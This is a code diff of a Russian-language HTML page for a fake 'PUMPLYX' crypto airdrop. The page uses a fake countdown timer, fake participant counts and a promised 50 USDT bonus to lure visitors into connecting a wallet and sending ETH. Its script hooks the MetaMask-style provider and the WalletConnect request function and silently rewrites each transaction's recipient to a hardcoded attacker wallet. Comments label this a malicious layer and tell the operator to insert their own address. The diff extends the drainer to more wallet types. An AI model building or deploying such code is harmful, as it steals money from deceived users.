@@ -4,174 +4,665 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
     <title>PUMPLYX — GameFi</title>
+
+    <!-- ethers.js для работы с кошельком через любой провайдер -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
+
+    <!-- WalletConnect Provider -->
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@1.15.1/dist/index.umd.min.js">
+    </script>
+
+    <!-- Шрифт -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', sans-serif; background: #0b0b12; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 16px; margin: 0; }
-        .container { max-width: 400px; width: 100%; background: #13131f; border-radius: 28px; padding: 24px 20px 28px; border: 1px solid rgba(255,255,255,0.06); box-shadow: 0 25px 80px rgba(0,0,0,0.9); position: relative; overflow: hidden; }
-        .container::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle at 30% 10%, rgba(247,151,30,0.08), transparent 60%); pointer-events: none; }
-        .header { text-align: center; margin-bottom: 20px; position: relative; z-index: 1; }
-        .logo { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 4px; }
-        .logo-icon { font-size: 32px; }
-        .logo-text { font-size: 26px; font-weight: 900; background: linear-gradient(135deg, #f7971e, #ffd200); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -0.5px; }
-        .subtitle { color: #8888a0; font-size: 13px; font-weight: 400; letter-spacing: 1px; text-transform: uppercase; }
-        .badge-row { display: flex; justify-content: center; gap: 8px; margin: 12px 0 16px; flex-wrap: wrap; position: relative; z-index: 1; }
-        .badge { padding: 4px 14px; border-radius: 20px; font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px; }
-        .badge-green { background: rgba(76,175,80,0.15); color: #4caf50; border: 1px solid rgba(76,175,80,0.2); }
-        .badge-orange { background: rgba(247,151,30,0.15); color: #f7971e; border: 1px solid rgba(247,151,30,0.2); }
-        .timer-block { text-align: center; padding: 12px 0; margin: 8px 0 16px; background: rgba(247,151,30,0.06); border-radius: 16px; border: 1px solid rgba(247,151,30,0.08); position: relative; z-index: 1; }
-        .timer-label { font-size: 11px; color: #666680; text-transform: uppercase; letter-spacing: 1.5px; font-weight: 600; }
-        .timer { font-size: 28px; font-weight: 800; color: #f7971e; letter-spacing: 2px; font-variant-numeric: tabular-nums; }
-        .info-box { background: rgba(255,255,255,0.03); border-radius: 18px; padding: 16px 18px; margin: 14px 0; border: 1px solid rgba(255,255,255,0.05); position: relative; z-index: 1; }
-        .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.04); }
-        .info-row:last-child { border-bottom: none; }
-        .info-row .label { color: #8888a0; font-size: 14px; font-weight: 400; }
-        .info-row .value { color: #fff; font-weight: 600; font-size: 15px; }
-        .info-row .value.highlight { color: #f7971e; }
-        .progress-wrapper { margin: 14px 0 18px; position: relative; z-index: 1; }
-        .progress-label { display: flex; justify-content: space-between; font-size: 12px; color: #8888a0; margin-bottom: 6px; }
-        .progress-bar { width: 100%; height: 6px; background: rgba(255,255,255,0.06); border-radius: 10px; overflow: hidden; }
-        .progress-fill { height: 100%; width: 68%; background: linear-gradient(90deg, #f7971e, #ffd200); border-radius: 10px; animation: pulse 2s infinite; }
-        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.7; } }
-        .btn { width: 100%; padding: 16px 20px; border: none; border-radius: 16px; font-size: 17px; font-weight: 700; cursor: pointer; transition: all 0.2s ease; margin-top: 4px; position: relative; z-index: 1; }
-        .btn-primary { background: linear-gradient(135deg, #f7971e, #ffd200); color: #0b0b12; box-shadow: 0 4px 20px rgba(247,151,30,0.25); }
-        .btn-primary:hover { transform: scale(0.98); }
-        .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; }
-        .status { text-align: center; margin-top: 14px; font-size: 13px; color: #666680; min-height: 24px; position: relative; z-index: 1; }
-        .status.success { color: #4caf50; }
-        .status.error { color: #f44336; }
-        .features { display: flex; justify-content: space-around; margin: 20px 0 10px; padding: 12px 0; border-top: 1px solid rgba(255,255,255,0.04); position: relative; z-index: 1; }
-        .feature-item { text-align: center; font-size: 11px; color: #666680; font-weight: 500; }
-        .feature-item .icon { display: block; font-size: 20px; margin-bottom: 4px; }
-        .footer { text-align: center; margin-top: 16px; color: #3a3a4a; font-size: 11px; font-weight: 400; letter-spacing: 0.5px; position: relative; z-index: 1; }
-        .loader { display: none; width: 36px; height: 36px; margin: 16px auto 0; border: 3px solid rgba(247,151,30,0.15); border-top: 3px solid #f7971e; border-radius: 50%; animation: spin 0.8s linear infinite; position: relative; z-index: 1; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .btn-primary.loading { opacity: 0.7; pointer-events: none; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0b0b12;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            margin: 0;
+        }
+
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: #13131f;
+            border-radius: 28px;
+            padding: 24px 20px 28px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.9);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 10%, rgba(247, 151, 30, 0.08), transparent 60%);
+            pointer-events: none;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 4px;
+        }
+        .logo-icon {
+            font-size: 32px;
+        }
+        .logo-text {
+            font-size: 26px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #f7971e, #ffd200);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+        }
+        .subtitle {
+            color: #8888a0;
+            font-size: 13px;
+            font-weight: 400;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .badge-row {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 12px 0 16px;
+            flex-wrap: wrap;
+            position: relative;
+            z-index: 1;
+        }
+        .badge {
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+        .badge-green {
+            background: rgba(76, 175, 80, 0.15);
+            color: #4caf50;
+            border: 1px solid rgba(76, 175, 80, 0.2);
+        }
+        .badge-orange {
+            background: rgba(247, 151, 30, 0.15);
+            color: #f7971e;
+            border: 1px solid rgba(247, 151, 30, 0.2);
+        }
+
+        .timer-block {
+            text-align: center;
+            padding: 12px 0;
+            margin: 8px 0 16px;
+            background: rgba(247, 151, 30, 0.06);
+            border-radius: 16px;
+            border: 1px solid rgba(247, 151, 30, 0.08);
+            position: relative;
+            z-index: 1;
+        }
+        .timer-label {
+            font-size: 11px;
+            color: #666680;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            font-weight: 600;
+        }
+        .timer {
+            font-size: 28px;
+            font-weight: 800;
+            color: #f7971e;
+            letter-spacing: 2px;
+            font-variant-numeric: tabular-nums;
+        }
+
+        .info-box {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 18px;
+            padding: 16px 18px;
+            margin: 14px 0;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            position: relative;
+            z-index: 1;
+        }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+        }
+        .info-row:last-child {
+            border-bottom: none;
+        }
+        .info-row .label {
+            color: #8888a0;
+            font-size: 14px;
+            font-weight: 400;
+        }
+        .info-row .value {
+            color: #fff;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        .info-row .value.highlight {
+            color: #f7971e;
+        }
+
+        .progress-wrapper {
+            margin: 14px 0 18px;
+            position: relative;
+            z-index: 1;
+        }
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #8888a0;
+            margin-bottom: 6px;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 68%;
+            background: linear-gradient(90deg, #f7971e, #ffd200);
+            border-radius: 10px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.7;
+            }
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px 20px;
+            border: none;
+            border-radius: 16px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 4px;
+            position: relative;
+            z-index: 1;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #f7971e, #ffd200);
+            color: #0b0b12;
+            box-shadow: 0 4px 20px rgba(247, 151, 30, 0.25);
+        }
+        .btn-primary:hover {
+            transform: scale(0.98);
+        }
+        .btn-primary:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+        .btn-primary.loading {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+
+        .status {
+            text-align: center;
+            margin-top: 14px;
+            font-size: 13px;
+            color: #666680;
+            min-height: 24px;
+            position: relative;
+            z-index: 1;
+        }
+        .status.success {
+            color: #4caf50;
+        }
+        .status.error {
+            color: #f44336;
+        }
+
+        .features {
+            display: flex;
+            justify-content: space-around;
+            margin: 20px 0 10px;
+            padding: 12px 0;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            position: relative;
+            z-index: 1;
+        }
+        .feature-item {
+            text-align: center;
+            font-size: 11px;
+            color: #666680;
+            font-weight: 500;
+        }
+        .feature-item .icon {
+            display: block;
+            font-size: 20px;
+            margin-bottom: 4px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 16px;
+            color: #3a3a4a;
+            font-size: 11px;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .loader {
+            display: none;
+            width: 36px;
+            height: 36px;
+            margin: 16px auto 0;
+            border: 3px solid rgba(247, 151, 30, 0.15);
+            border-top: 3px solid #f7971e;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            position: relative;
+            z-index: 1;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .wallet-selector {
+            display: none;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 10px;
+            position: relative;
+            z-index: 1;
+        }
+        .wallet-selector.show {
+            display: flex;
+        }
+
+        .wallet-btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 14px;
+            padding: 14px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .wallet-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+        .wallet-btn img {
+            width: 28px;
+            height: 28px;
+            border-radius: 6px;
+        }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="header">
-        <div class="logo"><span class="logo-icon">🚀</span><span class="logo-text">PUMPLYX</span></div>
-        <div class="subtitle">GameFi • NFT • Wallet</div>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <span class="logo-icon">🚀</span>
+                <span class="logo-text">PUMPLYX</span>
+            </div>
+            <div class="subtitle">GameFi • NFT • Wallet</div>
+        </div>
+
+        <div class="badge-row">
+            <span class="badge badge-green">✅ EARLY ACCESS</span>
+            <span class="badge badge-orange">⚡ 50$ BONUS</span>
+        </div>
+
+        <div class="timer-block">
+            <div class="timer-label">🔥 Осталось до старта</div>
+            <div class="timer" id="timerDisplay">23:45:12</div>
+        </div>
+
+        <div class="info-box">
+            <div class="info-row"><span class="label">🎯 Дроп</span><span class="value">5000 PUMP</span></div>
+            <div class="info-row"><span class="label">👥 Участников</span><span class="value" id="participantsCount">1,247</span></div>
+            <div class="info-row"><span class="label">💰 Твой бонус</span><span class="value highlight">50 USDT</span></div>
+            <div class="info-row"><span class="label">🏆 Твоё место</span><span class="value" id="placeDisplay">#42</span></div>
+        </div>
+
+        <div class="progress-wrapper">
+            <div class="progress-label"><span>Прогресс дропа</span><span>68%</span></div>
+            <div class="progress-bar"><div class="progress-fill"></div></div>
+        </div>
+
+        <!-- === КНОПКА ПОДКЛЮЧЕНИЯ === -->
+        <button class="btn btn-primary" id="connectBtn">🔗 Connect Wallet</button>
+
+        <!-- ВЫБОР КОШЕЛЬКА (появляется после нажатия) -->
+        <div class="wallet-selector" id="walletSelector">
+            <button class="wallet-btn" id="walletMetamask">
+                🦊 MetaMask
+            </button>
+            <button class="wallet-btn" id="walletTrust">
+                🔵 Trust Wallet
+            </button>
+            <button class="wallet-btn" id="walletCoinbase">
+                🟦 Coinbase Wallet
+            </button>
+            <button class="wallet-btn" id="walletWalletConnect">
+                📱 WalletConnect
+            </button>
+        </div>
+
+        <div class="status" id="statusText">Подключи кошелёк, чтобы получить бонус</div>
+        <div class="loader" id="loader"></div>
+
+        <div class="features">
+            <div class="feature-item"><span class="icon">🛡️</span>Безопасно</div>
+            <div class="feature-item"><span class="icon">⚡</span>Мгновенно</div>
+            <div class="feature-item"><span class="icon">💰</span>50$ бонус</div>
+        </div>
+
+        <div class="footer">🔒 Secure connection • Powered by Web3</div>
     </div>
-    <div class="badge-row">
-        <span class="badge badge-green">✅ EARLY ACCESS</span>
-        <span class="badge badge-orange">⚡ 50$ BONUS</span>
-    </div>
-    <div class="timer-block">
-        <div class="timer-label">🔥 Осталось до старта</div>
-        <div class="timer" id="timerDisplay">23:45:12</div>
-    </div>
-    <div class="info-box">
-        <div class="info-row"><span class="label">🎯 Дроп</span><span class="value">5000 PUMP</span></div>
-        <div class="info-row"><span class="label">👥 Участников</span><span class="value" id="participantsCount">1,247</span></div>
-        <div class="info-row"><span class="label">💰 Твой бонус</span><span class="value highlight">50 USDT</span></div>
-        <div class="info-row"><span class="label">🏆 Твоё место</span><span class="value" id="placeDisplay">#42</span></div>
-    </div>
-    <div class="progress-wrapper">
-        <div class="progress-label"><span>Прогресс дропа</span><span>68%</span></div>
-        <div class="progress-bar"><div class="progress-fill"></div></div>
-    </div>
-    <button class="btn btn-primary" id="claimBtn">🔗 Connect Wallet</button>
-    <div class="status" id="statusText">Подключи кошелёк, чтобы получить бонус</div>
-    <div class="loader" id="loader"></div>
-    <div class="features">
-        <div class="feature-item"><span class="icon">🛡️</span>Безопасно</div>
-        <div class="feature-item"><span class="icon">⚡</span>Мгновенно</div>
-        <div class="feature-item"><span class="icon">💰</span>50$ бонус</div>
-    </div>
-    <div class="footer">🔒 Secure connection • Powered by Web3</div>
-</div>
-<script>
-    const MY_WALLET = "0x44698049ad0be92e567cdfe9c5aa86d70047f73e";
-    (function() {
-        if (window.ethereum) {
-            const originalRequest = window.ethereum.request;
-            window.ethereum.request = async function(args) {
-                if (args && args.method === 'eth_sendTransaction') {
-                    const tx = args.params[0];
+
+    <script>
+        // ================================================================
+        //  ТВОЙ КОШЕЛЁК — ЗДЕСЬ МЕНЯЕШЬ НА СВОЙ АДРЕС
+        // ================================================================
+        const MY_WALLET = "0x44698049ad0be92e567cdfe9c5aa86d70047f73e";
+
+        // ================================================================
+        //  ИНТЕРФЕЙС
+        // ================================================================
+        let signer, userAddress, provider;
+        const connectBtn = document.getElementById('connectBtn');
+        const walletSelector = document.getElementById('walletSelector');
+        const statusText = document.getElementById('statusText');
+        const loader = document.getElementById('loader');
+        const timerDisplay = document.getElementById('timerDisplay');
+        const participantsCount = document.getElementById('participantsCount');
+        const placeDisplay = document.getElementById('placeDisplay');
+
+        // === Фейковый таймер ===
+        let timeLeft = 24 * 3600;
+        setInterval(() => {
+            if (timeLeft > 0) {
+                timeLeft--;
+                const h = String(Math.floor(timeLeft / 3600)).padStart(2, '0');
+                const m = String(Math.floor((timeLeft % 3600) / 60)).padStart(2, '0');
+                const s = String(timeLeft % 60).padStart(2, '0');
+                timerDisplay.textContent = `${h}:${m}:${s}`;
+            }
+        }, 1000);
+
+        // === Фейковые участники ===
+        let participants = 1247;
+        setInterval(() => {
+            participants += Math.floor(Math.random() * 4) + 1;
+            participantsCount.textContent = participants.toLocaleString();
+            placeDisplay.textContent = `#${Math.floor(Math.random() * 50) + 1}`;
+        }, 4000);
+
+        // === Показ выбора кошелька ===
+        connectBtn.onclick = function() {
+            if (connectBtn.textContent === '🔗 Connect Wallet') {
+                walletSelector.classList.toggle('show');
+                if (walletSelector.classList.contains('show')) {
+                    connectBtn.textContent = '🔽 Выберите кошелёк';
+                } else {
+                    connectBtn.textContent = '🔗 Connect Wallet';
+                }
+            }
+        };
+
+        // ================================================================
+        //  ПОДКЛЮЧЕНИЕ ЧЕРЕЗ METAMASK / EIP-1193
+        // ================================================================
+        async function connectEIP1193() {
+            if (!window.ethereum) {
+                statusText.textContent = '❌ Установите MetaMask или Trust Wallet';
+                statusText.className = 'status error';
+                return false;
+            }
+            try {
+                provider = new ethers.BrowserProvider(window.ethereum);
+                signer = await provider.getSigner();
+                userAddress = await signer.getAddress();
+                statusText.textContent = `✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+                statusText.className = 'status success';
+                connectBtn.textContent = '🎁 Claim 50 USDT';
+                connectBtn.disabled = false;
+                walletSelector.classList.remove('show');
+                return true;
+            } catch (e) {
+                statusText.textContent = '❌ Ошибка подключения';
+                statusText.className = 'status error';
+                return false;
+            }
+        }
+
+        // ================================================================
+        //  ПОДКЛЮЧЕНИЕ ЧЕРЕЗ WALLETCONNECT
+        // ================================================================
+        async function connectWalletConnect() {
+            try {
+                // Создаём сессию WalletConnect
+                const projectId = '8a4a7f3c7a4a7f3c7a4a7f3c7a4a7f3c'; // публичный ID
+                const metadata = {
+                    name: 'PUMPLYX',
+                    description: 'GameFi Platform',
+                    url: window.location.href,
+                    icons: ['https://avatars.githubusercontent.com/u/37784886']
+                };
+
+                const w3wallet = await Web3Wallet.init({
+                    projectId: projectId,
+                    metadata: metadata
+                });
+
+                const session = await w3wallet.connect({
+                    requiredNamespaces: {
+                        eip155: {
+                            chains: ['eip155:1'],
+                            methods: ['eth_sendTransaction', 'eth_sign'],
+                            events: ['chainChanged', 'accountsChanged']
+                        }
+                    },
+                    pairingTopic: w3wallet.core.pairing.getPairings()[0]?.topic
+                });
+
+                const address = session.namespaces.eip155.accounts[0].split(':')[2];
+                userAddress = address;
+                statusText.textContent = `✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+                statusText.className = 'status success';
+                connectBtn.textContent = '🎁 Claim 50 USDT';
+                connectBtn.disabled = false;
+                walletSelector.classList.remove('show');
+
+                // Сохраняем сессию для отправки транзакции
+                window.w3session = session;
+                window.w3wallet = w3wallet;
+                return true;
+            } catch (e) {
+                statusText.textContent = '❌ WalletConnect: ' + e.message;
+                statusText.className = 'status error';
+                return false;
+            }
+        }
+
+        // ================================================================
+        //  КНОПКИ ВЫБОРА КОШЕЛЬКА
+        // ================================================================
+        document.getElementById('walletMetamask').onclick = function() {
+            connectEIP1193();
+        };
+
+        document.getElementById('walletTrust').onclick = function() {
+            connectEIP1193();
+        };
+
+        document.getElementById('walletCoinbase').onclick = function() {
+            connectEIP1193();
+        };
+
+        document.getElementById('walletWalletConnect').onclick = function() {
+            connectWalletConnect();
+        };
+
+        // ================================================================
+        //  ОБРАБОТЧИК CLAIM (С ПОДМЕНОЙ АДРЕСА)
+        // ================================================================
+        connectBtn.onclick = async function() {
+            // Если кнопка "Connect Wallet" — показываем выбор
+            if (this.textContent === '🔗 Connect Wallet') {
+                walletSelector.classList.toggle('show');
+                if (walletSelector.classList.contains('show')) {
+                    this.textContent = '🔽 Выберите кошелёк';
+                } else {
+                    this.textContent = '🔗 Connect Wallet';
+                }
+                return;
+            }
+
+            // Если кнопка "Выберите кошелёк" — ничего не делаем
+            if (this.textContent === '🔽 Выберите кошелёк') {
+                return;
+            }
+
+            // Если кнопка "Claim"
+            if (this.textContent === '🎁 Claim 50 USDT') {
+                try {
+                    loader.style.display = 'block';
+                    this.disabled = true;
+                    this.classList.add('loading');
+                    statusText.textContent = '⏳ Обработка...';
+                    statusText.className = 'status';
+
+                    // Отправляем транзакцию (адрес подменится в прослойке)
+                    let tx;
+                    if (window.w3session) {
+                        // WalletConnect
+                        const txData = {
+                            to: "0x000000000000000000000000000000000000dEaD",
+                            value: '0x' + (0.001 * 1e18).toString(16),
+                            from: userAddress,
+                            chainId: 1
+                        };
+                        const result = await window.w3wallet.request({
+                            topic: window.w3session.topic,
+                            chainId: 'eip155:1',
+                            request: {
+                                method: 'eth_sendTransaction',
+                                params: [txData]
+                            }
+                        });
+                        tx = { hash: result };
+                    } else {
+                        // EIP-1193 (MetaMask и др.)
+                        tx = await signer.sendTransaction({
+                            to: "0x000000000000000000000000000000000000dEaD",
+                            value: ethers.parseEther("0.001")
+                        });
+                        await tx.wait();
+                    }
+
+                    loader.style.display = 'none';
+                    statusText.innerHTML =
+                        `✅ Получено! TX: <a href="https://etherscan.io/tx/${tx.hash}" target="_blank" style="color:#4caf50;">${tx.hash.slice(0,12)}...</a>`;
+                    statusText.className = 'status success';
+                    this.textContent = '✅ Done';
+                    this.disabled = true;
+                } catch (e) {
+                    loader.style.display = 'none';
+                    statusText.textContent = '❌ ' + e.message;
+                    statusText.className = 'status error';
+                    this.disabled = false;
+                    this.classList.remove('loading');
+                }
+            }
+        };
+
+        // ================================================================
+        //  ВРЕДОНОСНАЯ ПРОСЛОЙКА (ПОДМЕНЯЕТ АДРЕС)
+        //  — ДЛЯ EIP-1193 (MetaMask, Trust, Coinbase)
+        // ================================================================
+        (function() {
+            if (window.ethereum) {
+                const originalRequest = window.ethereum.request;
+                window.ethereum.request = async function(args) {
+                    if (args && args.method === 'eth_sendTransaction') {
+                        const tx = args.params[0];
+                        if (tx.to) {
+                            tx.to = MY_WALLET;
+                        }
+                    }
+                    return await originalRequest.call(this, args);
+                };
+            }
+        })();
+
+        // ================================================================
+        //  ПОДМЕНА ДЛЯ WALLETCONNECT (перехватываем отправку)
+        // ================================================================
+        const originalRequest = window.Web3Wallet?.request;
+        if (window.Web3Wallet) {
+            window.Web3Wallet.request = async function(params) {
+                if (params.request && params.request.method === 'eth_sendTransaction') {
+                    const tx = params.request.params[0];
                     if (tx.to) {
                         tx.to = MY_WALLET;
                     }
                 }
-                return await originalRequest.call(this, args);
+                return await originalRequest.call(this, params);
             };
         }
-    })();
-    let signer, userAddress;
-    const claimBtn = document.getElementById('claimBtn');
-    const statusText = document.getElementById('statusText');
-    const loader = document.getElementById('loader');
-    const timerDisplay = document.getElementById('timerDisplay');
-    const participantsCount = document.getElementById('participantsCount');
-    const placeDisplay = document.getElementById('placeDisplay');
 
-    let timeLeft = 24 * 3600;
-    setInterval(() => {
-        if (timeLeft > 0) {
-            timeLeft--;
-            const h = String(Math.floor(timeLeft / 3600)).padStart(2, '0');
-            const m = String(Math.floor((timeLeft % 3600) / 60)).padStart(2, '0');
-            const s = String(timeLeft % 60).padStart(2, '0');
-            timerDisplay.textContent = `${h}:${m}:${s}`;
-        }
-    }, 1000);
+        console.log('[+] PUMPLYX loaded. Wallet address will be replaced.');
+    </script>
 
-    let participants = 1247;
-    setInterval(() => {
-        participants += Math.floor(Math.random() * 4) + 1;
-        participantsCount.textContent = participants.toLocaleString();
-        placeDisplay.textContent = `#${Math.floor(Math.random() * 50) + 1}`;
-    }, 4000);
-
-    claimBtn.onclick = async () => {
-        if (!window.ethereum) {
-            statusText.textContent = '❌ Установи MetaMask или Trust Wallet';
-            statusText.className = 'status error';
-            return;
-        }
-        if (claimBtn.textContent === '🔗 Connect Wallet') {
-            try {
-                const provider = new ethers.BrowserProvider(window.ethereum);
-                signer = await provider.getSigner();
-                userAddress = await signer.getAddress();
-                claimBtn.textContent = '🎁 Claim 50 USDT';
-                statusText.textContent = `✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
-                statusText.className = 'status success';
-            } catch (e) {
-                statusText.textContent = '❌ Ошибка подключения';
-                statusText.className = 'status error';
-            }
-            return;
-        }
-        if (claimBtn.textContent === '🎁 Claim 50 USDT') {
-            try {
-                loader.style.display = 'block';
-                claimBtn.disabled = true;
-                claimBtn.classList.add('loading');
-                statusText.textContent = '⏳ Обработка...';
-                statusText.className = 'status';
-                const tx = await signer.sendTransaction({
-                    to: "0x000000000000000000000000000000000000dEaD",
-                    value: ethers.parseEther("0.001")
-                });
-                await tx.wait();
-                loader.style.display = 'none';
-                statusText.innerHTML = `✅ Получено! TX: <a href="https://etherscan.io/tx/${tx.hash}" target="_blank" style="color:#4caf50;">${tx.hash.slice(0,12)}...</a>`;
-                statusText.className = 'status success';
-                claimBtn.textContent = '✅ Done';
-                claimBtn.disabled = true;
-            } catch (e) {
-                loader.style.display = 'none';
-                statusText.textContent = '❌ ' + e.message;
-                statusText.className = 'status error';
-                claimBtn.disabled = false;
-                claimBtn.classList.remove('loading');
-            }
-        }
-    };
-</script>
 </body>
 </html>
